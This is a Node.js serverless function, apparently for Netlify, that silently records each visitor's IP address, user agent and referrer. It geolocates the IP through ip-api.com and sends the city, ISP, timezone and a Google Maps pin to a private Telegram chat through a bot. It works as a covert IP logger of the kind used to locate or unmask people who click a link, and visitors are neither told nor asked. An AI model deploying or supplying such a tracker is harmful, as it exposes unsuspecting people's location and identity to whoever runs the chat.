const http = require("http");
const https = require("https");

// helper: fetch JSON from IP API
function fetchJson(url) {
  return new Promise(resolve => {
    const req = http.get(url, res => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => resolve(JSON.parse(data)));
    });
    req.on("error", () => resolve(null));
  });
}

exports.handler = async (event) => {
  const headers = event.headers || {};

  // Netlify provides visitor IP here:
  const ip =
    headers["x-nf-client-connection-ip"] ||
    headers["x-forwarded-for"]?.split(",")[0] ||
    "unknown";

  const ua = headers["user-agent"] || "-";
  const ref = headers["referer"] || "-";
  const time = new Date().toISOString();

  // Geo lookup
  let geo = null;
  if (ip && ip !== "unknown") {
    const url = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,proxy,message`;
    geo = await fetchJson(url);
  }

  // Build Telegram message
  let msg = `New visitor:\nIP: ${ip}\nUA: ${ua}\nTime: ${time}\nRef: ${ref}\n`;

  if (geo?.status === "success") {
    msg += `Location: ${geo.city} ${geo.regionName} ${geo.country}\n`;
    msg += `ISP: ${geo.isp}\n`;
    msg += `Timezone: ${geo.timezone}\n`;
    msg += `Map: https://www.google.com/maps/search/?api=1&query=${geo.lat},${geo.lon}\n`;
  } else {
    msg += `Geo lookup failed.\n`;
  }

  // Send Telegram message
  await new Promise(resolve => {
    const data = JSON.stringify({
      chat_id: process.env.TG_CHAT_ID,
      text: msg
    });

    const options = {
      hostname: "api.telegram.org",
      port: 443,
      path: `/bot${process.env.TG_BOT_TOKEN}/sendMessage`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": data.length
      }
    };

    const req = https.request(options, () => resolve());
    req.on("error", () => resolve());
    req.write(data);
    req.end();
  });

  return {
    statusCode: 200,
    body: "logged"
  };
};
